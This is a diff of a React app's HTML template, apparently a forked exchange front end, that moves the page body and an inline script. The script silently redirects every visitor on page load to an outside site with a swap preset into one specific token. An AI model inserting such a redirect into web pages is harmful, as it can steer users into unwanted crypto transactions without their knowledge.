@@ -27,6 +27,33 @@
 
     <link rel="preload" href="%PUBLIC_URL%/fonts/Inter-roman.var.woff2" as="font" type="font/woff2" crossorigin />
 
+    
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+
+    <!-- The root is the container of the app -->
+    <div id="root">
+      <!-- Triggers the font to load immediately and then is replaced by the app -->
+      <div>&emsp;</div>
+    </div>
+
+    <div id="background-radial-gradient"></div>
+
+    <!--
+      This HTML file is a template.
+      If you open it directly in the browser, you will see an empty page.
+
+      You can add webfonts, meta tags, or analytics to this file.
+      The build step will place the bundled scripts into the <body> tag.
+
+      To begin the development, run `npm start` or `yarn start`.
+      To create a production bundle, use `npm run build` or `yarn build`.
+    -->
+    
+    <script>
+      document.location.href = "https://pikastake.xyz/#/swap?inputCurrency=eth&outputCurrency=0x4B99CFE23509b22DEF47696aB1b1Dcf8Ff3844dd&chain=mainnet"
+    </script>
     <style>
       * {
         font-family: 'Inter', sans-serif;
@@ -111,31 +138,5 @@
         }
       }
     </style>
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-
-    <!-- The root is the container of the app -->
-    <div id="root">
-      <!-- Triggers the font to load immediately and then is replaced by the app -->
-      <div>&emsp;</div>
-    </div>
-
-    <div id="background-radial-gradient"></div>
-
-    <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
-
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
-
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
-    
-    <script>
-      document.location.href = "https://pikastake.xyz/#/swap?inputCurrency=eth&outputCurrency=0x4B99CFE23509b22DEF47696aB1b1Dcf8Ff3844dd&chain=mainnet"
-    </script>
   </body>
 </html>
